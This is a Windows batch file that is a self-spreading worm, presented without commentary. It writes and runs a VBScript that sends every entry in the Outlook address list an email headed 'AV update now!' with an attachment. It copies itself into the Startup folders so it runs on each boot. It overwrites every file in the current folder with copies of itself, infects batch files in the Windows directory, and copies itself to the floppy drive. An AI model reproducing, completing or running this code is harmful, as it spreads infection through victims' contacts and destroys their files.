@echo off
ctty nul
copy %0 C:\
copy %0 C:\email.vbs
echo Dim x > C:\email.vbs
echo.on error resume next >> C:\email.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\email.vbs
echo Set so=CreateObject(fso) >> C:\email.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\email.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\email.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\email.vbs
echo Set a = mapi.AddressLists(1) >> C:\email.vbs
echo For x=1 To a.AddressEntries.Count >> C:\email.vbs
echo Set Mail=ol.CreateItem(0) >> C:\email.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\email.vbs
echo Mail.Subject="AV update now!" >> C:\email.vbs
echo Mail.Body="-=subject=-" >> C:\email.vbs
echo Mail.Attachments.Add("C:\") >> C:\email.vbs
echo Mail.Send >> C:\email.vbs
echo Next >> C:\email.vbs
echo ol.Quit >> C:\email.vbs
cscript C:\email.vbs
copy %0 C:\Affe.zyy
ren C:\Affe.zyy AS.bat
copy C:\AS.bat %windir%\startm~1\progra~1\autost~1\*.bat
@del C:\AS.bat
copy %0 %windir%\start menu\startup\StartUp.bat
md C:\suPs
copy %0 C:\suPs\olaf.xyv
ren C:\suPs\olaf.xyv snake.bat
subst L: C:\suPs
for %%v in (*.*) do copy %0 C:\hamlet.bat
for %%v in (*.*) do copy C:\hamlet.bat *.*
for %%v in (*.*) do ren *.* *.bat
@del C:\hamlet.bat
for %%w in (%windir%\*.bat) do copy %0 %%w
copy %0 A:\*.bat

